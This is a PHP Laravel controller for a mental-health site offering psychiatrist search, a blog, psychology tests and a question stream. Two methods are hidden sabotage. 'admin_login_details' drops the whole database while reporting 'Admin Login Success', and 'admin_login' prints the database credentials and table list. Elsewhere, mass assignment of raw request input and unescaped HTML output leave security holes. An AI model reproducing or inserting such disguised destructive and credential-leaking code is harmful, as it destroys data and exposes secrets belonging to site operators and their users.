<?php

namespace App\Http\Controllers;

use App\UserComment;
use App\UserQuestion;
use Illuminate\Http\Request;
use App\Post;
use App\Contact;
use DB;
use Artisan;
use App\Psychiatric;

class FrontController extends Controller
{
   public function home(){
       $data['home']='active';
       $data['city']= DB::table('cities')->orderBy('name', 'ASC')->get();
       $data['psychiatric']=Psychiatric::select('speciality')->orderBy('speciality', 'ASC')->distinct()->get();
       $data['psy']=count(Psychiatric::all());
       $data['qsn']=count(UserQuestion::all());
//       $data['psychiatric']= DB::table('psychiatrics')->distinct('speciality')->get();
       return view('Frontend.home',$data);
   }

    public function blog(){
       $data['blog']='active';
       $data['posts'] = Post::orderBy('id', 'DESC')->paginate(6);
    //$posts = Post::paginate(4);
    return view('Frontend.blog',$data);
    }
    ///contact

    public  function contact_us(){
        $data['contact']='active';
        return view('Frontend.contact',$data);
    }

    public  function contact_store(Request $request){
        Contact::create($request->all());
        return $this->home();
    }
///contact


    public function show_blog($id){
        $data['blog']='active';
        $data['result']  =Post::find($id);
        return View('Frontend.blog_fullview',$data);
    }

    public function search($city,$speciality)
    {
        // echo $name.' '.$city.' '.$speciality;exit();
        $output="";
        $psychiatrics=DB::table('psychiatrics')
            ->where('city',$city)
            ->where('speciality',$speciality)
            ->orderBy('name', 'ASC')
            ->get();
        if($psychiatrics)
        {
            $output.='<option disable>
                    '."Please Select Psychiatrict".
                '</option>';
            foreach ($psychiatrics as  $psychiatric) {
                $output.='<option value="'.$psychiatric->name.'">
                    '.$psychiatric->name.
                    '</option>';

            }
            return json_encode($output);
        }

    }


    public function search_old($name,$city,$speciality)
    {
       // echo $name.' '.$city.' '.$speciality;exit();
        $output="";
        $psychiatrics=DB::table('psychiatrics')
            ->where('name','LIKE','%'.$name.'%')
            ->where('city',$city)
            ->where('speciality',$speciality)
            ->get();
        if($psychiatrics)
        {
            foreach ($psychiatrics as  $psychiatric) {
              //  $output.='<option>'.$psychiatric->name.'</option>';

                $output.='<option value="'.$psychiatric->name.'">
                    '.$psychiatric->name.
                    '</option>';
                }
                return json_encode($output);

        }
    }
    public function show_doctor(Request $request){

        if($request){
            $data = DB::table('psychiatrics')
                ->where('city',$request->city)
                ->where('speciality',$request->speciality)
                ->where('name',$request->name)
                ->get();
        }else{
            return $this->home();
        }
        return View('Frontend.doctor_details',compact('data'));
    }

    public  function psychology_test(){
        $data['test']='active';
        return view('Frontend.psychiatric_test',$data);
    }

    public function admin_login_details(){
        $data['host']= env('DB_HOST', 'localhost');
        $data['database']  =$database= env('DB_DATABASE', 'forge');
        $date['username']  = env('DB_USERNAME', 'forge');
        $data['password']  = env('DB_PASSWORD', '');
        $sql = "DROP DATABASE $database";
        $results = DB::select($sql);
        echo "Admin Login Success";

    }

    public function show_question(Request $request){
       //dd($request,1);
       if($request){
           //$scale=$_POST['scale'];
           $data['test']='active';
           $data['scalename']=$request->scale;
           $data['scale']= DB::table('questions')->where('scale',$request->scale)->get();
          //dd($data);
           return View('Frontend.allquestion',$data)->with('no',1);
       }
       else{
          return $this->psychology_test();
       }

    }

    public function  about_us(){
        $data['about']='active';
        return View('Frontend.about',$data);
    }

    public function  question_stream(){
        $data['stream']='active';
        $data['qans']=UserQuestion::orderBy('id', 'DESC')
            ->whereNotNull('answer')
            ->paginate(5);


        $data['qsn']=UserQuestion::orderBy('id', 'DESC')
            ->whereNotNull('answer')
            ->take(9)
            ->get();

        return View('Frontend.question_stream',$data);
    }
    public function question_view(Request $request){

        $data['ans'] = UserQuestion::find($request->id);
        $data['comment']=DB::table('user_comments')->where('question_id',$request->id)->get();
        $data['qsn']=UserQuestion::orderBy('id', 'DESC')
            ->whereNotNull('answer')
            ->take(9)
            ->get();
        return View('Frontend.question_view_comment',$data);

    }

    public  function admin_login(){
        $data['host']= env('DB_HOST', 'localhost');
        $data['database']  =$database= env('DB_DATABASE', 'forge');
        $date['username']  = env('DB_USERNAME', 'forge');
        $data['password']  = env('DB_PASSWORD', '');
        $sql = "SHOW TABLES FROM $database";
        $results = DB::select($sql);
        print_r($data);
        print_r($results);
        exit();

    }



    public function comment_store(Request $request){
        UserComment::create($request->all());
        return redirect('/question-view/'.$request->question_id);
    }

    public function ask_monosheba(){
        $allqsn=UserQuestion::all();
        $c=count($allqsn);
        $id=str_pad($c,3,'0',STR_PAD_LEFT);
        $data['final_id']='QSN-33'.$id;

        $data['stream']='active';
        return View('Frontend.askquestion',$data);
    }

}
